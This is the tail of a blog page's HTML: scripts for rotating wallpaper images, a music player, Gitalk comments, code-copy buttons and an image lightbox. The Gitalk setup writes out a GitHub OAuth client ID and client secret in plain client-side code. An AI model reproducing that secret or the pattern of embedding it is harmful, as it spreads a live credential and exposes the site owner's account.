"https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/298468D7-E388-44A8-8CC5-8213BDC33CED.jpeg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
        if ('.cover') {
          $('.cover').backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        } else {
          $.backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        }
      });
    </script>
  



  
    
<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>

  
    
<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js"></script>

  






  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: "6dbe0fb891585031b176",
      clientSecret: "4407fec5af8e37150b5a4cb82821318d91c07769",
      repo: "comments",
      owner: "schrodinger17",
      admin: "schrodinger17",
      
        id: location.pathname,      // Ensure uniqueness and length less than 50
      
      distractionFreeMode: false  // Facebook-like distraction free mode
    });
    gitalk.render('gitalk-container');
  </script>








  
<script src="/js/app.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>




  
    
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>

    <script>hljs.initHighlightingOnLoad();</script>
  



<!-- 复制 -->

  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-check-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-check-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-times-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-times-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>




<!-- fancybox -->

  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("div.fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* 图片采用懒加载处理时,
       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
       * 那么此处将原本的属性名src替换为对应属性名data-original,
       * 修改如下
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>






  <script>setLoadingBarProgress(100);</script>
</body>
</html>
